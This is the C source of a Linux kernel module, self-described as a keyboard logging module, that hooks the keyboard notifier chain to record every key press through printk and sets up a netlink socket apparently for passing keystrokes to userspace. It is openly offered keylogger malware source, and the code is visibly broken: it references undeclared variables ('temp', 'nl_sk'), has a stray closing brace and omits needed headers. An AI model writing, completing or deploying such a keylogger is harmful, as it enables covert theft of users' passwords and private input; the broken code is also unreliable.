#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>

#include "keys.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Keyboard Logging Kernel Module");

static int key_event_interrupt(struct notifier_block *nb, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    // Checks the type of event for a 'press' event
    if (code == KBD_KEYCODE && param->down) {
        // Stores the key
        printk(KERN_INFO "%d", temp);
	}
    }

    return NOTIFY_OK;
}

static struct notifier_block nb = {
    .notifier_call = key_event_interrupt
};

// Module initialization function
static int __init keylogger_init(void)
{
    struct netlink_kernel_cfg cfg = {
        .input = NULL,
    };

    nl_sk = netlink_kernel_create(&init_net, NETLINK_USERSOCK, &cfg);
    if (!nl_sk) {
        printk(KERN_ERR "Failed to create netlink socket\n");
        return -ENOMEM;
    }

    // Register the keyboard interrupt handler
    if(register_keyboard_notifier(&nb)){
        pr_err("Failed to register keyboard notifier\n");
        return -1;
    }
    
    pr_info("Keylogger module initialized\n");
    return 0;
}

// Module cleanup function
static void __exit keylogger_exit(void)
{
    // Unregister the keyboard interrupt handler
    unregister_keyboard_notifier(&nb);
    
    pr_info("Keylogger module exited\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

